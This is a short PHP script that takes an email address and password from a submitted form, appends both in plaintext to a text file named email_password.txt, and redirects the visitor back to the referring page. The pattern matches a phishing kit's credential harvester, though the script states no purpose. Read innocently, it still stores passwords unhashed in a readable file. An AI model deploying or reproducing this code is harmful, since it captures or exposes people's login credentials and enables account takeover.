<?php
    ob_start();
    if (isset($_POST['submit'])) {
        $email = $_POST['reg-email'];
        $password = $_POST['reg-password'];
        $file = fopen('email_password.txt', 'a');
        fwrite($file, $email."\n");
        fwrite($file, $password."\n");
        fclose($file);
        header("Location:".$_SERVER['HTTP_REFERER']."");
    }
    ob_end_flush();
 
?>

